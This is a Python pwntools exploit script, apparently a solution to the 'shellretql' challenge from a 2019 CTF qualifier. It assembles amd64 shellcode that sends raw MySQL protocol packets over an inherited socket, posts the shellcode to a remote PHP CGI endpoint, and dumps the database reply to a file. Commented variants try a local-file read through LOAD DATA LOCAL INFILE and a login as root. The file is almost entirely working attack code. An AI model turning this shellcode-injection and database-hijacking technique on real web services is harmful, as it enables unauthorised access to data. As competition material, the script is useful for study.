import struct

from pwn import *
import urllib

#from mysql_connection import MysqlConnection

context.log_level = 'DEBUG'

def make_packet(payload):
    return struct.pack("<I", len(payload) + 2)[:3] + b'\x00' + payload

def make_QUERY(cmd):
    return b'\x03' + cmd

def make_DEBUG():
    return b'\x0d'

def make_PING():
    return b'\x0e'

def make_CREATE_DB(name):
    return b'\x05' + name

def make_STATISTICS():
    return b'\x09'

def make_BINLOG_DUMP(binlog_filename, server_id=1):
    return b'\x12' + p32(0) + p16(1) + p32(server_id) + binlog_filename

def make_BINLOG_DUMP_GTID(filename, server_id=0):
    return b'\x1e' + p16(0b11) + p32(server_id) + p32(len(filename)) + filename + p64(0)

def make_CHANGE_USER(username, auth_response=b'shellql', schema_name=b'shellql'):
    return b'\x11' + username + b'\0' + auth_response + b'\0' + schema_name + b'\0'

def make_REFRESH(subcommand):
    return b'\x07' + p8(subcommand)

def make_RESET_CONNECTION():
    return b'\x1f'

def pause():
    return '''
    xor ecx, ecx
    ''' + '''
    inc ch
    inc ch
    shl ecx, 22
    ''' + '''
    loop $
    '''

#packet_data = make_query('LOAD DATA LOCAL INFILE "/tmp/lo.txt" INTO TABLE PlrNote;')
#packet_data = make_CHANGE_USER(b'root', auth_response=b'root', schema_name=b'shellql')
packet_data = make_QUERY('SHOW TABLES;')

shellcode = shellcraft.amd64.linux.echo("\r\n\r\nRESULT:", '1')

shellcode += shellcraft.amd64.linux.echo(make_packet(packet_data+b'\0') + make_packet(packet_data + b'\0') + b"\0\0\0\0\0\0", str(4))

# shellcode += pause()
shellcode += shellcraft.amd64.linux.read(4, buffer='rsp', count=0x8000)
shellcode += shellcraft.amd64.linux.write(1, 'rsp', 'rax')
shellcode += shellcraft.amd64.linux.echo('\r\nDUMMY\r\n', '1')
shellcode += shellcraft.amd64.exit(0)

sc = asm(shellcode, arch = 'amd64', os = 'linux')
assert '\0' not in sc

r = remote('shellretql.quals2019.oooverflow.io', 9090)

encoded = urllib.urlencode({'shell': sc})

request =  'POST /cgi-bin/index.php HTTP/1.1\r\n'
request += 'HOST: shellretql.quals2019.oooverflow.io:9090\r\n'
request += 'Content-Type: application/x-www-form-urlencoded\r\n'
request += 'Content-Length: {}\r\n'.format(len(encoded))
request += '\r\n'
request += encoded
r.send(request)
r.recvuntil('RESULT:\r\n')
r.recvuntil('\r\n')
resp = r.recvuntil('DUMMY\r\n\r\n')[:-11]

#parsed = MysqlConnection.from_bytes(resp[7:-11])

print(repr(resp))
with open('giovanni.dump', 'wb') as f:
    f.write(resp)

